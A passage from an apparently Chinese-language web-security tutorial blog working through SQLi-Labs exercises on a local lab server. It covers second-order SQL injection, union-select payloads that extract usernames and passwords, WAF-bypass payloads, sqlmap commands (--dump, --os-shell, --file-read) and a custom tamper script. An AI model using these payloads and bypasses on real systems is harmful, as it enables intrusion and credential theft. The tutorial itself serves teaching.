class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd7kb80ve2j31lq0oeadb.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326193839335"></p><p>可以发现并不是修改了账号为<code>admin &#39;#</code>的密码，而是修改了账号为<code>admin</code>的密码。这其中就存在着二次注入漏洞。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd7kc5ibvnj313l0u0qv6.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd7kc5ibvnj313l0u0qv6.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326193932012"></p><p><strong>分析漏洞</strong></p><p>查看pass_change.php源代码，并将上述账号密码带入。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd7kf3cd2jj31yc06a1ke.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd7kf3cd2jj31yc06a1ke.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326194221936"></p><p>则程序最终会执行：<code> $sql = &quot;UPDATE users SET PASSWORD=&#39;1&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;;</code> （<code>#</code>执行单条语句注释）</p><p>根据<code>#</code>注释之后，程序会执行<code> $sql = &quot;UPDATE users SET PASSWORD=&#39;1&#39; where username=&#39;admin&#39;&quot;；</code></p><h4 id="3-4实战-SQLi-Labs-Less-24-改编"><a href="#3-4实战-SQLi-Labs-Less-24-改编" class="headerlink" title="3.4实战 SQLi-Labs Less-24 (改编)"></a>3.4实战 SQLi-Labs Less-24 (改编)</h4><blockquote><p>设置数据表users中的username字段为VARCHAR(255)</p><p>使得username的长度为0-255之间</p><p>ALTER TABLE <code>users</code> CHANGE <code>username</code> <code>username</code> VARCHAR(255) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL;</p><p>创建userlist.php文件中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php部分代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users ORDER BY id asc&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>= mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$num</span> = mysql_num_rows(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> = <span class="variable">$num</span> ; ++j)(</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line">  <span class="variable">$username</span> = <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">  <span class="variable">$sql_detail</span> = <span class="string">&quot;SELECT * FROM users where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$result_detail</span> = mysql_query(<span class="variable">$sql_detail</span>);</span><br><span class="line">  <span class="variable">$num_detail</span> = mysql_num_rows(<span class="variable">$result_detail</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span> ; <span class="variable">$i</span> = <span class="variable">$num_detail</span> ; ++<span class="variable">$i</span>))(</span><br><span class="line"><span class="variable">$row_detail</span> = mysql_fetch_array(<span class="variable">$result_detail</span>);</span><br><span class="line">  <span class="keyword">echo</span> &lt;&lt;&lt;END</span><br><span class="line">  &lt;table border=<span class="string">&quot;1&quot;</span> style=<span class="string">&quot;table-layout;fixed;&quot;</span> width=<span class="string">&quot;1000&quot;</span>&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">  &lt;th&gt;<span class="variable">$row_detail</span>[<span class="number">1</span>]&lt;/th&gt;</span><br><span class="line">  &lt;th&gt;<span class="variable">$row_detail</span>[<span class="number">2</span>]&lt;/th&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">  &lt;/table&gt;</span><br><span class="line"> END;</span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>创建账号为1’ union select 1,user(),3# 密码随意</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd7kyu8feoj31mk0ni7bn.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd7kyu8feoj31mk0ni7bn.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326200120285"></p><p>查看数据库users内容，可以看到1’ union select 1,user()被SQL执行器执行了。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd7l2nvm6yj31ee0a6tc1.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd7l2nvm6yj31ee0a6tc1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326200500545"></p><p><strong>分析漏洞</strong></p><p>查看userlist.php源代码，并将上述账号密码带入。</p><p><code>$sql_detail=&quot;SELECT * FROM users where username=&#39;$username&#39;&quot;</code></p><p>带入username=1’ union select 1,user(),3#</p><p><code>$sql_detail=&quot;SELECT * FROM users where username=&#39;1&#39; union select 1,user(),3#&#39;&quot;</code></p><p>由于前半句查询结果为空，因此执行union，返回user()。</p><p><strong>利用漏洞查询信息</strong></p><p>设置账号为1’ union select 1,(select concat_ws(0x7e,username,password) from security.users limit 0,1),3#</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd9s2cuhufj31ce03oab3.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd9s2cuhufj31ce03oab3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326202008221"></p><h4 id="3-5-二次注入防御"><a href="#3-5-二次注入防御" class="headerlink" title="3.5 二次注入防御"></a>3.5 二次注入防御</h4><p>对外部提交的数据，需要更加谨慎的对待。</p><p>程序内部的数据调用，也要严格的进行检查，一旦不小心，攻击者就能将特定SQL语句带入到查询当中。</p><h2 id="四、WAF（Web-Application-Firewell）绕过原理"><a href="#四、WAF（Web-Application-Firewell）绕过原理" class="headerlink" title="四、WAF（Web Application Firewell）绕过原理"></a>四、WAF（Web Application Firewell）绕过原理</h2><blockquote><ol><li>熟练掌握MySQL函数和语法使用方法</li><li>深入了解中间件运行处理机制</li><li>了解WAF防护原理及方法</li></ol></blockquote><h4 id="4-1-WAF绕过原理-白盒绕过"><a href="#4-1-WAF绕过原理-白盒绕过" class="headerlink" title="4.1 WAF绕过原理-白盒绕过"></a>4.1 WAF绕过原理-白盒绕过</h4><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd7prdh750j31060co4p0.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd7prdh750j31060co4p0.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326224707795"></p><p>分析代码：使用了blacklist()函数过滤<code>or</code>和<code>AND</code>，<code>i</code>指的是忽略大小写</p><p>绕过限制：<del>1. 大小写变形<code>Or</code>、<code>OR</code>、<code>oR</code></del>  2. 等价替换 <code>and</code>–&gt;<code>&amp;&amp;</code>以及<code>or</code>–&gt;<code>||</code> 3. 诸如<code>OorR</code>之类绕过。</p><h4 id="4-2-WAF绕过原理-黑盒绕过"><a href="#4-2-WAF绕过原理-黑盒绕过" class="headerlink" title="4.2 WAF绕过原理-黑盒绕过"></a>4.2 WAF绕过原理-黑盒绕过</h4><ol><li><p>架构层绕过WAF</p><ol><li>寻找源站-&gt;针对云WAF</li><li>利用同网段-&gt;绕过WAF防护区域</li><li>利用边界漏洞-&gt;绕过WAF防护区域 ssrf漏洞</li></ol></li><li><p>资源限制角度绕过WAF</p><ol><li>POST大BODY（发送很大的数据包）</li></ol></li><li><p>协议层面绕过WAF</p><ol><li>协议未覆盖绕过WAF(请求方式变换 GET-&gt;POST；Content-Type变换：application/x-www-form-urlencoded-&gt;multipart/form-data;.)</li><li>参数污染<code>index.php?id=1&amp;id=2(SQL注入)</code></li></ol></li><li><p>规则层面的绕过（<code>%25</code>-&gt;<code>%</code>）<img src="https://tva1.sinaimg.cn/large/00831rSTly1gd7qos2qpfj31mu0qu1kx.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd7qos2qpfj31mu0qu1kx.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326231914929"> </p></li></ol><h4 id="4-3-Fuzz绕过WAF"><a href="#4-3-Fuzz绕过WAF" class="headerlink" title="4.3 Fuzz绕过WAF"></a>4.3 Fuzz绕过WAF</h4><p>以注释绕过为例子，开始Fuzz </p><blockquote><p>注释符绕过      <strong><code>union/*something*/select</code></strong></p><ul><li>先测试最基本的： <code> union/**/select</code></li><li>再测试中间引入特殊字： <code>union/*aaaa%01bbs*/select</code></li><li>最后测试注释长度： <code>union/*aaaaaaaaaaaaaaaaaaaaaaa*/select</code></li></ul></blockquote><p>构造Payload：<a href="http://127.0.0.1:8999/Less-1/?id=1&#39;">http://127.0.0.1:8999/Less-1/?id=1&#39;</a> and ‘1’=’1</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd7r7l5pfhj31300dswle.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd7r7l5pfhj31300dswle.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200326233720169"></p><p>通过BurpSuite的Intruder暴力破解WAF规则</p><p>将空格 替换为 <code>/*%!%2f*/</code> 以及特殊函数 <code>xx()</code> -&gt; <code>xx/*%!%2f*/()</code></p><p>示例Payload: <code>http:127.0.0.1:8999/Less-0/?id=&#39;/*%!%2f*/union/*%!%2f*/select/*%!%2f*/2,(select/*%!%2f*/table_name/*%!%2f*/from/*%!%2f*/information_schema.tables/*%!%2f*/where/*%!%2f*/table_schema=0x7365637572697479/*%!%2f*/limit/*%!%2f*/0,1),4--+</code></p><h2 id="五、SqlMapWaf绕过脚本编写"><a href="#五、SqlMapWaf绕过脚本编写" class="headerlink" title="五、SqlMapWaf绕过脚本编写"></a>五、SqlMapWaf绕过脚本编写</h2><h4 id="5-1-SQLMAP介绍"><a href="#5-1-SQLMAP介绍" class="headerlink" title="5.1 SQLMAP介绍"></a>5.1 SQLMAP介绍</h4><p>SQLMAP下载地址：<a href="http://sqlmap.org/">http://sqlmap.org/</a></p><p>查看SQLMAP是否安装 python3 sqlmap.py -h</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd8ivily6ij31240u0qv9.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd8ivily6ij31240u0qv9.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200327153430204"></p><h4 id="5-2-SQLMAP常用注入测试语句"><a href="#5-2-SQLMAP常用注入测试语句" class="headerlink" title="5.2 SQLMAP常用注入测试语句"></a>5.2 SQLMAP常用注入测试语句</h4><p>测试1： <code>python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot;</code> 查询SQL注入点</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd9kyqhzwgj31hq06akdb.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd9kyqhzwgj31hq06akdb.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200328133222788"></p><p>测试2： <code>python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; --current-db</code> 查询当前数据库</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd9l0m5ywyj31hq0bkhdt.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd9l0m5ywyj31hq0bkhdt.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200328133410973"></p><p>测试3： <code>python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; --current-user</code> 查询当前用户</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd9l17wvgyj31hs0bce81.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd9l17wvgyj31hs0bce81.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200328133445662"></p><p>测试4： <code>python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; --dbs</code> 该测试服务器所有数据库的名称</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd9l538icjj31hy0924qp.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd9l538icjj31hy0924qp.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200328133829093"></p><p>测试5： <code>python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; -D security --tables</code> </p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd9l6wzdcjj31hs0bmhdt.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd9l6wzdcjj31hs0bmhdt.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200328134014554"></p><p>测试6： <code>python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; -D security -T users --columns</code></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd9l6nfoa5j31hs0e8u0x.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd9l6nfoa5j31hs0e8u0x.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200328133958944"></p><p>测试7： <code>python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; -D security -T users -C username,passsword --dump</code></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd9l7dj3vgj31fo0u0u0z.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd9l7dj3vgj31fo0u0u0z.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200328134038126"></p><p>测试8： <code>python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; --os-shell</code></p><p>测试9： <code>python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; --sql-shell</code> 交互式SQL界面</p><p>测试10： <code>python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; --file-read=‘var/www/a.php’</code> </p><p>测试11： <code>python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; --file-write 本地文件 --file-dest 目标文件</code></p><h4 id="5-3-SQLMAP-Tamper-脚本介绍"><a href="#5-3-SQLMAP-Tamper-脚本介绍" class="headerlink" title="5.3 SQLMAP Tamper 脚本介绍"></a>5.3 SQLMAP Tamper 脚本介绍</h4><p>SQLMAP目录下Tamper文件夹中的一些脚本：</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd9lc9giomj321b0u0e82.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd9lc9giomj321b0u0e82.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200328134522199"></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd9leasprdj32k60u0e81.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd9leasprdj32k60u0e81.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200328134713736"></p><h4 id="5-4-SQLMAP-Tamper-脚本编写"><a href="#5-4-SQLMAP-Tamper-脚本编写" class="headerlink" title="5.4 SQLMAP Tamper 脚本编写"></a>5.4 SQLMAP Tamper 脚本编写</h4><p>以<code>base64encode.py</code>为例子查阅如何编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 头部声明</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注释声明</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用可能所需的第三方库和SQLMAP内部调用</span></span><br><span class="line"><span class="keyword">from</span> lib.core.convert <span class="keyword">import</span> encodeBase64</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 改变Payload的代码函数 </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Base64-encodes all characters in a given payload</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&quot;1&#x27; AND SLEEP(5)#&quot;)</span></span><br><span class="line"><span class="string">    &#x27;MScgQU5EIFNMRUVQKDUpIw==&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encodeBase64(payload, binary=<span class="literal">False</span>) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br></pre></td></tr></table></figure><p>编写脚本：sqli-lab28.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.convert <span class="keyword">import</span> encodeBase64</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Bypass SQLi-Labs/Less-28</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">       payload = payload.replace(<span class="string">&#x27;union select&#x27;</span>,<span class="string">&#x27;union all select&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;%0a&#x27;</span>)</span><br><span class="line">     <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><h4 id="5-5实战-SQLi-Labs-Less-28（分析Fuzz方法）"><a href="#5-5实战-SQLi-Labs-Less-28（分析Fuzz方法）" class="headerlink" title="5.5实战 SQLi-Labs Less-28（分析Fuzz方法）"></a>5.5实战 SQLi-Labs Less-28（分析Fuzz方法）</h4><p>查看源代码，可以发现blacklist()函数将<code>/ * - # space &#123;union +select&#125; </code>过滤。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd9qq75qb5j310c0h4e81.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd9qq75qb5j310c0h4e81.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200328165146098"></p><p>调用5.4编写的<code>sqli-labs.py</code>脚本</p><p>SQLMAP语句：<code>python3 sqlmap -u &quot;http://127.0.0.1:8999/Less-28/?id=1&quot; --flush-session --tamper=sqli-labs28.py</code></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> 盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】三、SQL盲注</title>
      <link href="2020/03/25/%E3%80%90Web%E5%AE%89%E5%85%A8%E3%80%91%E4%B8%89%E3%80%81SQL%E7%9B%B2%E6%B3%A8/"/>
      <url>2020/03/25/%E3%80%90Web%E5%AE%89%E5%85%A8%E3%80%91%E4%B8%89%E3%80%81SQL%E7%9B%B2%E6%B3%A8/</url>
      
